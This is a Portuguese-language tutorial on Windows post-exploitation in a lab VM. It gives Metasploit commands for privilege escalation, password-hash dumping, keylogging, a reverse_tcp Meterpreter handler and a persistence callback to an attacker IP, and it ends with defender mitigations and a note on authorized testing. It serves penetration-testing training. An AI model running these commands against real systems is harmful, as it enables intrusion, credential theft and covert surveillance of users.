# Pós-Exploração em Sistemas

## Objetivo Geral

Aprender técnicas avançadas de pós-exploração para manter acesso persistente e extrair dados de sistemas comprometidos.

---

## Pré-requisitos

- Conhecimento básico de linha de comando Linux.
- Familiaridade com conceitos de exploração de vulnerabilidades.

---

## Etapa 1: Escalonamento de Privilégios no Windows

### Conceitos Fundamentais

- **Pós-Exploração**: Ações realizadas após obter acesso inicial (shell/Meterpreter).
- **Escalonamento de Privilégios**: Elevar permissões de usuário padrão para admin/root.

### Técnicas Comuns

1. **Exploração de Misconfigurações**:
   - Serviços com permissões inadequadas.
   - Arquivos executáveis com permissões de escrita.
2. **Uso de Ferramentas**:
   - `getsystem` (Meterpreter).
   - `Windows-Exploit-Suggester` para identificar vulnerabilidades.

### Prática

1. Obtenha um shell básico na VM Windows.
2. Execute comandos para verificar privilégios:
   ```cmd
   whoami /priv
   ```
3. Utilize módulos do Metasploit como `exploit/windows/local/bypassuac`.

---

## Etapa 2: Extração de Dados com Metasploit

### Ferramentas-Chave

- **Meterpreter**: Sessão avançada para coleta de dados.
- **Comandos Úteis**:
  ```meterpreter
  hashdump          # Extrai hashes de senhas SAM
  screenshot        # Captura tela do alvo
  keyscan_start     # Inicia keylogger
  ```

### Fluxo de Trabalho

1. Estabeleça uma sessão Meterpreter:
   ```bash
   use exploit/multi/handler
   set payload windows/meterpreter/reverse_tcp
   exploit
   ```
2. Extraia credenciais:
   ```meterpreter
   run post/windows/gather/credentials/credential_collector
   ```

---

## Etapa 3: Módulos de Pós-Exploração no Metasploit

### Categorias de Módulos

| Tipo                      | Descrição                | Exemplo                          |
| ------------------------- | ------------------------ | -------------------------------- |
| **Extract Credentials**   | Coleta senhas e hashes.  | `post/windows/gather/hashdump`   |
| **Privilege Escalation**  | Eleva privilégios.       | `exploit/windows/local/ms16_032` |
| **Information Gathering** | Coleta dados do sistema. | `post/multi/gather/env`          |
| **Spy/Capture**           | Monitora atividades.     | `post/windows/capture/keylog`    |

### Prática

1. Liste módulos disponíveis:
   ```bash
   search post/
   ```
2. Execute um módulo de coleta:
   ```bash
   use post/windows/gather/enum_logged_on_users
   run
   ```

---

## Etapa 4: Persistência de Sessão

### Técnicas de Persistência

1. **Módulo `persistence`**:

   ```meterpreter
   run persistence -X -i 60 -p 4444 -r 192.168.1.100
   ```

   - `-X`: Inicia na inicialização do sistema.
   - `-i 60`: Tentativas de reconexão a cada 60 segundos.

2. **Alternativas**:
   - Adicionar tarefas agendadas (`schtasks`).
   - Modificar chaves de registro (`HKLM\Software\Microsoft\Windows\CurrentVersion\Run`).

### Validação

1. Reinicie a VM alvo.
2. Reconecte-se usando o mesmo handler:
   ```bash
   use exploit/multi/handler
   set payload windows/meterpreter/reverse_tcp
   exploit
   ```

---

## Boas Práticas e Mitigação

- **Para Defensores**:
  - Monitorar processos não autorizados.
  - Restringir permissões de usuários.
  - Atualizar sistemas regularmente.
- **Para Testes Éticos**:
  - Sempre obter autorização por escrito.
  - Documentar todas as ações realizadas.

**Nota**: Estas técnicas devem ser usadas apenas em ambientes controlados e com consentimento explícito.
